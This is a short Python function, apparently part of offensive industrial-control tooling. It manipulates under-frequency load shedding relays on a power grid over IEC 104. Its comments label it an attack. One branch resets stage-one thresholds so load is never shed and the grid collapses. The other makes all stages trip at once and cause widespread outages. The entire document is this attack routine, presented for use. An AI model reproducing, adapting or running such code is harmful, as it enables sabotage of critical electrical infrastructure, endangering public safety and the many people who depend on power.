def manipulate_load_shedding(ufls_relays):
    """
    Under-Frequency Load Shedding (UFLS) manipulation

    ufls_relays: List of UFLS relay configurations
    """
    # Normal UFLS stages:
    # Stage 1: 59.5 Hz - shed 10% load
    # Stage 2: 59.3 Hz - shed additional 10%
    # Stage 3: 59.0 Hz - shed additional 10%

    for relay in ufls_relays:
        # Attack: Set all stages to impossible frequency
        # Grid will never shed load, leading to collapse

        # Stage 1: Set to 50.0 Hz (never reached)
        iec104_modify_relay_settings(
            relay_ip=relay['ip'],
            relay_ioa=relay['stage1_ioa'],
            new_setting_value=50.0
        )

        # Or: Trigger all stages immediately at 59.9 Hz
        # Causes unnecessary widespread outages
        for stage in [relay['stage1_ioa'], relay['stage2_ioa'], relay['stage3_ioa']]:
            iec104_modify_relay_settings(
                relay_ip=relay['ip'],
                relay_ioa=stage,
                new_setting_value=59.9  # Trigger immediately
            )

    print("[+] Load shedding scheme manipulated")
